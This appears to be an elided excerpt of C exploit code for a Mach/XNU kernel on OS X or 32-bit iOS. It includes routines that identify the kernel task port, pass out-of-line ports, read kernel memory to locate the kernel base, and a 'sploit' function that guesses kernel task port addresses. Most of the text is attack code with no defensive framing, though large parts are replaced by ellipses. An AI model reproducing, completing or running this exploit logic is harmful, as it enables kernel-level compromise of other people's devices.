...
int is_port_kernel_task_port(mach_port_t kt_port, uint32_t kernel_address) {
  int pid = 0x41414141;
  kern_return_t err = pid_for_task(kt_port, &pid);
  return (err == KERN_SUCCESS && pid == 0);
}

mach_port_t receive_ool_ports(mach_port_t q, mach_port_t expected, uint32_t valid_kernel_pointer) {
  kern_return_t err;
...
uint32_t find_kernel_base(mach_port_t ktp, uint32_t hostport_addr, uint32_t* _realhost) {
  uint32_t realhost = r32(ktp, hostport_addr+0x68);
  printf("realhost: 0x%x\n", realhost);
  
  *_realhost = realhost;
  
  uint32_t base = realhost & ~0xfffULL;
...
mach_port_t sploit(mach_port_t host_priv, uint32_t* kernel_base, uint32_t* realhost) {
  //kern_return_t err;
  ...
  printf("read context value: 0x%x\n", context);
  ...
  uint32_t pages_base = context & ~0xfffULL;
  ...
  printf("guessing the kernel task port pointer is somewhere above %x\n", pages_base);
...
void platform_detection() {
  ...
  if (page_size == 0x1000) { // OS X / 32-bit iOS has 4k pages
